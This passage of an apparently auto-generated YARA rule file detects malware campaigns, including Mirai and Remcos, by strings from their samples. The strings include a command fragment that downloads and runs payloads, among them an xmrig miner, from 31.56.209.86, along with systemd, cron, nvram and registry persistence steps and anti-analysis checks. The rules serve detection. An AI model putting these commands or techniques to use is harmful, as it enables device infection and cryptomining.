        $s1 = "149,G:0x170},S=a0y;return/headless|bytespider/i[S(a0Y.M)](a0X[S(a0Y.G)]);},'appVersionCheck':functio" ascii
        $s2 = "0W.M)]||a0X[L(0x147)][L(0x142)]===0x0;},'zeroOuterDimensions':function(){var a0p={M:0x16b},x=a0y;ret" ascii
        $s3 = "n(){var a0h={M:0x15c},u=a0y;return/headless/i[u(0x149)](a0X[u(a0h.M)]);},'pluginArraySpoofing':funct" ascii
        $s4 = "(function(M,G){var a0R={M:0x15a,G:0x162,J:0x14e,y:0x153},s=a0y,J=M();while(!![]){try{var y=-parseInt" ascii
        $s5 = ")];return!M;},'mimeTypeArraySpoofing':function(){var a0K={M:0x154,G:0x177},I=a0y;let M=MimeTypeArray" ascii
        $s6 = ":0x146,n:0x172,N:0x148,b:0x160,o:0x156,R:0x175};setTimeout(function(){var q=a0y,M=window['document']" ascii
        $s7 = "urn window[x(a0p.M)+'t']===0x0&&window['outerWidth']===0x0;}},a0F=function(J,y){var a0f={M:0x179,G:0" ascii
        $s8 = "ion(){var a0Z={M:0x177,G:0x142,J:0x177,y:0x14d,X:0x154},t=a0y;let M=PluginArray[t(a0Z.M)]===a0X['plu" ascii
        $s9 = "['shift']());}}}(a0J,0x9d547));function a0y(M,G){var J=a0J();return a0y=function(y,X){y=y-0x13e;var " ascii
        $s10 = "X[I(0x176)][0x0][I(0x154)];return!M;},'noLanguage':function(){var a0W={M:0x144},L=a0y;return!a0X[L(a" ascii
        $s11 = "nction(B,E){var a0v={M:0x141},a=F?function(){var P=a0y;if(E){var C=E[P(a0v.M)](B,arguments);return E" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a05f40df_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a05f40df"
        date = "2026-10-22"
        campaign = "tlsh-a05f40df"
        family = "mirai"
        hash = "0a1327d4807c606bdbbb54b1bf56d82ee289a1e1dd41848a8d72fcfdf97a24bc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a05f40df.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1c005053_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1c005053"
        date = "2026-10-22"
        campaign = "tlsh-1c005053"
        family = ""
        hash = "01aa491677c361e9263960bf73ebb644bec1960c1168f395a2e400ca294c4905"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1c005053.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ded88d77_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ded88d77"
        date = "2026-10-22"
        campaign = "tlsh-ded88d77"
        family = "remcos"
        hash = "0fe0003258d6d152e026cbde6bb73b6fb427c438a94e1876f514c845ac5068e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ded88d77.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "// SIG // BgEEAYI3AgEeMCQCAQEEEBDgyQbOONQRoqMAEEvTUJAC" ascii
        $s1 = "// SIG // hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor" ascii
        $s2 = "// SIG // AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg" ascii
        $s3 = "// SIG // Begin signature block" ascii
        $s4 = "// SIG // End signature block" ascii
    condition:
        filesize < 1048576 and 5 of them
}

rule Sightlines_dotnet_typelib_guid_788d52d8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-788d52d8"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-788d52d8"
        family = ""
        hash = "13cee49212b02538acec3887804d62cd696f29cbe37e5231809f16f384619be9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-788d52d8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Couldnt set the shellcode memory as PAGE_EXECUTE_READWRITE!" wide
        $s1 = "AntiAnalysis: Suspicious Machine GUID detected! Self-destructing..." wide
        $s2 = "SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet" wide
        $s3 = "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command" wide
        $s4 = "\\NETGATE Technologies\\BlackHawk\\Profiles" wide
        $s5 = "AntiAnalysis: Suspicious GPU detected! Self-destructing..." wide
        $s6 = "AntiAnalysis: Suspicious PC name detected! Self-destructing..." wide
        $s7 = "AntiAnalysis: Failed to retrieve Machine GUID. Exception: " wide
        $s8 = "AntiAnalysis: Suspicious PC username detected! Self-destructing..." wide
        $s9 = "HARDWARE\\Description\\System\\CentralProcessor\\0" wide
        $s10 = "AntiAnalysis: Suspicious IP detected! Self-destructing..." wide
        $s11 = "SystemPortableWorkspaceEfiLauncherInformation" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4016128 and 12 of them
}

rule Sightlines_tlsh_bd96c2c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bd96c2c5"
        date = "2026-10-22"
        campaign = "tlsh-bd96c2c5"
        family = ""
        hash = "408bed94fb0961193dbea6bebc82b9a8ff5fe645e9dd5a095296969e55757c27"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bd96c2c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "                'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\' + CONFIG.REG_VALUE_NAME," ascii
        $s1 = "            taskService.GetFolder('\\\\').GetTask(CONFIG.TASK_NAME);" ascii
        $s2 = "        var path = CONFIG.TEMP_DIR + randomName(CONFIG.SCRIPT_EXT);" ascii
        $s3 = "    var fso = new ActiveXObject('Scripting.FileSystemObject');" ascii
        $s4 = "        if (fso.FolderExists(CONFIG.TEMP_DIR)) return true;" ascii
        $s5 = "    var wsh = new ActiveXObject('WScript.Shell');" ascii
        $s6 = "        REG_VALUE_NAME: 'SystemHealthMonitor'," ascii
        $s7 = "        var xhr = new ActiveXObject('MSXML2.XMLHTTP');" ascii
        $s8 = "            def.RegistrationInfo.Description = CONFIG.DESCRIPTION;" ascii
        $s9 = "        DESCRIPTION: 'Windows System Maintenance Utility'" ascii
        $s10 = "    function registerScheduledTask(scriptPath) {" ascii
        $s11 = "    var taskService = new ActiveXObject('Schedule.Service');" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6ca30fb6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6ca30fb6"
        date = "2026-10-22"
        campaign = "tlsh-6ca30fb6"
        family = ""
        hash = "09e0f7616dfd2f7eb2876f6ef7331d6dbc78775acd594a94b0397a56717d1fcc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6ca30fb6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "JIT compiler disabled, CPU does not support SSE2" ascii
        $s2 = "unknown or malformed optimization flag '%s'" ascii
        $s3 = "PANIC: unprotected error in call to Lua API (" ascii
        $s4 = "Must use luaL_newstate() for 64 bit target" ascii
        $s5 = "ambiguous syntax (function call x new statement)" ascii
        $s6 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s7 = "attempt to yield across C-call boundary" ascii
        $s8 = "NYI: cannot call this C function (yet)" ascii
        $s9 = "wrong number of arguments for function call" ascii
        $s10 = "runtime code generation failed, restricted kernel?" ascii
        $s11 = "attempt to perform arithmetic on '%s' and '%s'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_host_1f477a31_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-1f477a31"
        date = "2026-10-22"
        campaign = "host-1f477a31"
        family = "mirai"
        hash = "197786c1b9008c2b87a5ae1db7d977a444bd4e658a95db1b92f0c594af637331"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-1f477a31.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "systemctl disable waternetwork.service 2>/dev/null" ascii
        $s1 = "systemctl enable waternetwork.service 2>/dev/null" ascii
        $s2 = "/etc/systemd/system/waternetwork.service" ascii
        $s3 = "systemctl daemon-reload 2>/dev/null" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "Description=Water Network Service" ascii
        $s6 = "Accept-Encoding: gzip, deflate" ascii
        $s7 = "/etc/cron.d/waternetwork" ascii
        $s8 = "Cache-Control: no-cache" ascii
        $s9 = "Connection: keep-alive" ascii
        $s10 = "bile Safari/537.36" ascii
        $s11 = "After=network.target" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_561d82e2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-561d82e2"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-561d82e2"
        family = ""
        hash = "0f0bdd9f64eea46f1e78279189cc709473c10b1a5b5e405c42791a8babfd4811"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-561d82e2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "`Gets or sets the SWN p value (probability of casual) for switching algorithm (Floyd 0--p--1 BFS)" ascii
        $s2 = "CThe third parameter of the distribution (shape c, xMin, xMax, k, v)" ascii
        $s3 = "]The probability of transmission per single sexual intercourse from Male to Male, (homosexual)" ascii
        $s4 = "2The fourth parameter of the distribution (xMax, w)" ascii
        $s5 = "7Is the group's population (graph vertices) initialised." ascii
        $s6 = "%System.Globalization.NumberFormatInfo!" ascii
        $s7 = "jThe second parameter of the distribution. (scale b, shape c, xMin, xMax, degree of freedom df, d, p" ascii
        $s8 = "_Gets or sets the maximum size for numerical calculation of the network efficiency (path length)" ascii
        $s9 = "]Gets or sets the number of initial infected individuals for Temporal and Conditional warm-up." ascii
        $s10 = "VGets or sets the probability of concurrent partnerships during the simulation warm-up." ascii
        $s11 = "2Gets or Sets the simulation warm-up configuration." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5315584 and 12 of them
}

rule Sightlines_imphash_c7478a25_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-c7478a25"
        date = "2026-10-22"
        campaign = "imphash-c7478a25"
        family = ""
        hash = "086e083da4e7a46438aff3188beb2c0d14cb38af216c62a880cd8209dfcfcca8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-c7478a25.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV_Null_resource@?1??null_memory_resource@@YAPEAVmemory_resource@pmr@std@@XZ@" ascii
        $s1 = ".?AV_Unaligned_new_delete_resource_impl@pmr@std@@" ascii
        $s2 = ".?AV_Aligned_new_delete_resource_impl@pmr@std@@" ascii
        $s3 = ".?AV_Identity_equal_resource@pmr@std@@" ascii
        $s4 = "_Unaligned_get_default_resource" ascii
        $s5 = "_Unaligned_set_default_resource" ascii
        $s6 = ".?AVmemory_resource@pmr@std@@" ascii
        $s7 = "_Aligned_get_default_resource" ascii
        $s8 = "_Aligned_set_default_resource" ascii
        $s9 = " C Runtime Library _1" wide
        $s10 = "MSVCP140_1.dll" ascii
        $s11 = "msvcp140_1.dll" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_838c4e76_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-838c4e76"
        date = "2026-10-22"
        campaign = "tlsh-838c4e76"
        family = "mirai"
        hash = "1b40941c18e456f93a1bbce6c440fae0b3c281cd56a527680f93cc088288e50c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-838c4e76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "cn3,73a~41+Cg)A(G{!" ascii
        $s2 = "qVcVf(@Vg= Vhm#Vi}&Vj" ascii
        $s3 = "/etc/config/hosts" ascii
        $s4 = "qQSRVSWTXUYVZW[" ascii
        $s5 = "FhFiFjFkFlFmFnFo&D" ascii
        $s6 = "R36al13`x!3b" ascii
        $s7 = "6Cg*7casb@2" ascii
        $s8 = "BcAR2a3f&g" ascii
        $s9 = "/ci\"OEQb1" ascii
        $s10 = "F@aChPbSg" ascii
        $s11 = "9'SdPa 1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b9b3c6c6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b9b3c6c6"
        date = "2026-10-22"
        campaign = "tlsh-b9b3c6c6"
        family = "mirai"
        hash = "417162f7a794e258ef2033892b1a3ced9c2ccd1df782f0a408de8c8c5072ece9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b9b3c6c6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "__linuxthreads_initial_report_events" ascii
        $s1 = "__linuxthreads_pthread_threads_max" ascii
        $s2 = "__GI_pthread_attr_getschedpolicy" ascii
        $s3 = "__GI_pthread_attr_setschedpolicy" ascii
        $s4 = "__pthread_wait_for_restart_signal" ascii
        $s5 = "__GI_pthread_attr_getinheritsched" ascii
        $s6 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s7 = "__GI_pthread_attr_setinheritsched" ascii
        $s8 = "__stdio_mutex_initializer.3833" ascii
        $s9 = "__pthread_kill_other_threads_np" ascii
        $s10 = "__GI_pthread_attr_getschedparam" ascii
        $s11 = "__pthread_set_own_extricate_if" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5b1a8a01_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b1a8a01"
        date = "2026-10-22"
        campaign = "tlsh-5b1a8a01"
        family = "mirai"
        hash = "64a20393edf06a5c37260435bf8e431d45d0b9454f00f5314e7274441065f620"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b1a8a01.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s1 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s2 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s3 = "__linuxthreads_initial_report_events" ascii
        $s4 = "__GI_pthread_attr_getschedpolicy" ascii
        $s5 = "__GI_pthread_attr_setschedpolicy" ascii
        $s6 = "__pthread_wait_for_restart_signal" ascii
        $s7 = "__GI_pthread_attr_getinheritsched" ascii
        $s8 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s9 = "__GI_pthread_attr_setinheritsched" ascii
        $s10 = "pthread_rwlockattr_getkind_np" ascii
        $s11 = "pthread_rwlockattr_setkind_np" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_082ec845_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-082ec845"
        date = "2026-10-22"
        campaign = "tlsh-082ec845"
        family = "mirai"
        hash = "894f8812b92a1b3fffff5ac2686c75db677180387edd41af6aea60c5ebf76e95"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-082ec845.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "__linuxthreads_pthread_sizeof_descr" ascii
        $s1 = "__linuxthreads_initial_report_events" ascii
        $s2 = "__linuxthreads_pthread_threads_max" ascii
        $s3 = "__GI_pthread_attr_getschedpolicy" ascii
        $s4 = "__GI_pthread_attr_setschedpolicy" ascii
        $s5 = "__pthread_wait_for_restart_signal" ascii
        $s6 = "__stdio_mutex_initializer.3862" ascii
        $s7 = "__GI_pthread_attr_getinheritsched" ascii
        $s8 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s9 = "__GI_pthread_attr_setinheritsched" ascii
        $s10 = "__pthread_kill_other_threads_np" ascii
        $s11 = "__GI_pthread_attr_getschedparam" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ac4305cd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ac4305cd"
        date = "2026-10-22"
        campaign = "tlsh-ac4305cd"
        family = ""
        hash = "3ea06f0ee098b4823cb79599df3780e7f23cce52c19aac31d2a0d47efe33a5e9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ac4305cd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "boost::math::expint_continued_fraction<%1%>(unsigned,%1%)" ascii
        $s1 = "?_Init@locale@std@@CAPEAV_Locimp@12@_N@Z" ascii
        $s2 = "?_Getgloballocale@locale@std@@CAPEAV_Locimp@12@XZ" ascii
        $s3 = "boost::math::expint_series<%1%>(unsigned,%1%)" ascii
        $s4 = "?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z" ascii
        $s5 = "boost::math::bessel_jy<%1%>(%1%,%1%) in temme_jy" ascii
        $s6 = "Cause unknown: error caused by bad argument with value %1%" ascii
        $s7 = "?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ" ascii
        $s8 = "boost::math::bessel_ik<%1%>(%1%,%1%) in temme_ik" ascii
        $s9 = "?getloc@ios_base@std@@QEBA?AVlocale@2@XZ" ascii
        $s10 = "boost::math::sph_bessel_j_small_z_series<%1%>(%1%,%1%)" ascii
        $s11 = "Series evaluation exceeded %1% iterations, giving up now." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_fe474526_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fe474526"
        date = "2026-10-22"
        campaign = "imphash-fe474526"
        family = ""
        hash = "1d50b83cbb74f6f7ca0498005ae1391405766b67e20b9ea521a3fc8006826d87"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fe474526.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "D:\\Projects\\pay\\tools\\wework_loader_go\\downloads\\zstd-src\\zstd-1.5.6\\lib\\dictBuilder\\divsufsort.c" wide
        $s1 = "WARNING: The maximum dictionary size %u is too large compared to the source size %u! size(source)/si" ascii
        $s2 = "warning : ZSTD_compressBegin_usingCDict failed " ascii
        $s3 = "ze(dictionary) = %f, but it should be >= 10! This may lead to a subpar dictionary! We recommend trai" ascii
        $s4 = "?Draw@CxImage@@QAEJPAUHDC__@@JJJJPAUtagRECT@@_N@Z" ascii
        $s5 = "!  consider increasing the number of samples (total size : %u MB)" ascii
        $s6 = "FASTCOVER must have at least one input file" ascii
        $s7 = "ning on sources at least 10x, and preferably 100x the size of the dictionary! " ascii
        $s8 = "Selected dict at position %u, of length %u : saves %u (ratio: %.2f)  " ascii
        $s9 = "FSE_normalizeCount error with matchLengthCount " ascii
        $s10 = "!  warning : selected content significantly smaller than requested (%u < %u) " ascii
        $s11 = "ZSTD_CCtxParams_registerSequenceProducer" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1252352 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_72e87269_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-72e87269"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-72e87269"
        family = ""
        hash = "025724959a876776d6ad66d8ffea90e8e0e37fc66679de9ca1711edec8d73527"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-72e87269.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "AVANJE JE ZAKASNILO - vrata sporija, nosivost smanjena" wide
        $s4 = "Potrebna snaga po vratima: {1:F0} kW (raspolo" wide
        $s5 = "The value for column 'd' in table 'DataTable1' is DBNull." wide
        $s6 = "The value for column 'c' in table 'DataTable1' is DBNull." wide
        $s7 = "The value for column 'f' in table 'DataTable1' is DBNull." wide
        $s8 = "The value for column 'b' in table 'DataTable1' is DBNull." wide
        $s9 = "The value for column 'e' in table 'DataTable1' is DBNull." wide
        $s10 = "The value for column 'a' in table 'DataTable1' is DBNull." wide
        $s11 = "<ComputeMachineLearningMetrics>b__6_4" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1691648 and 12 of them
}

rule Sightlines_imphash_1aa37283_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1aa37283"
        date = "2026-10-22"
        campaign = "imphash-1aa37283"
        family = ""
        hash = "00eb23895750f2ea8aa5dae08aa7120846404596f1ade0b142461597b4157ffe"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1aa37283.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show($env:SERO_MSG,'Notifi" wide
        $s1 = "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;" wide
        $s2 = "@<EstablishProxyTunnelAsync>d__576<EstablishSocksTunnel>d__58:<HandleHttp11Downgrade>d__105J<InjectN" ascii
        $s3 = "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;" wide
        $s4 = ".<>c__DisplayClass68_0`1\"<get_Claims>d__914AllowedBmpCodePointsBitmap2OptimizedInboxTextEncoder0Defa" ascii
        $s5 = "r<<GetAddrInfoWithTelemetryAsync>g__CompleteAsync|35_0>d`1.<>c__DisplayClass40_0`1$GetAddrInfoExStat" ascii
        $s6 = "Z<WaitForExitAsync>g__WaitUntilOutputEOF|186_1Z<GetProcessHandlePairs>g__SafeGetHandle|273_0" ascii
        $s7 = "[WinApi]::EnumDisplaySettings([System.IntPtr]::Zero,-1,[ref]$dm)|Out-Null;" wide
        $s8 = "J<CleanCacheAndDisposeIfUnused>b__65_0,<HandleAltSvc>b__138_08TryGetChallengeDataForScheme" ascii
        $s9 = "$f.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Perf" wide
        $s10 = "@<FlushAsyncInternal>g__Core|79_0j<ThrowIfDisposed>g__ThrowObjectDisposedException|80_0" ascii
        $s11 = "H<IsPreamble>g__IsPreambleWorker|57_0j<ThrowIfDisposed>g__ThrowObjectDisposedException|73_0@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17805312 and 12 of them
}

rule Sightlines_contacted_96645a0d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-96645a0d"
        date = "2026-10-22"
        campaign = "contacted-96645a0d"
        family = ""
        hash = "24294bb46842f08d3f37989de1f47d0aef9eaffa1fc9eea3ceda173702978641"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-96645a0d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s2 = "Partial loss of significance (PLOSS)" ascii
        $s3 = "api-ms-win-crt-multibyte-l1-1-0.dll" ascii
        $s4 = "Total loss of significance (TLOSS)" ascii
        $s5 = "Overflow range error (OVERFLOW)" ascii
        $s6 = "Argument domain error (DOMAIN)" ascii
        $s7 = "Argument singularity (SIGN)" ascii
        $s8 = "runtime error %d" ascii
        $s9 = "client32.exe" ascii
        $s10 = ":MZurLcB<B" ascii
        $s11 = "_ismbblead" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12253184 and 12 of them
}

rule Sightlines_contacted_0224a947_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-0224a947"
        date = "2026-10-23"
        campaign = "contacted-0224a947"
        family = ""
        hash = "503225b031ced0ed5573439c14fcdc9116b4e0661f1b557b86f84d046f172803"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-0224a947.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "crosoft.com/SMI/2020/WindowsSettings\"><heapType>SegmentHeap</heapType></asmv3:windowsSettings></asmv" ascii
        $s1 = "3:application></assembly>" ascii
        $s2 = "invalid random_device value" ascii
        $s3 = "@SUVWAVHcA" ascii
        $s4 = "D$ H3L$ H3" ascii
        $s5 = "D$HL9wXt" ascii
        $s6 = "L$HH1D$ " ascii
        $s7 = "UVAUAVAWI" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_2b53824b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2b53824b"
        date = "2026-10-21"
        campaign = "tlsh-2b53824b"
        family = "mirai"
        hash = "16f650696596a2b46a317d17e8c9b7e6a1dfc65d843a50769b87dd3944417d7e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2b53824b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
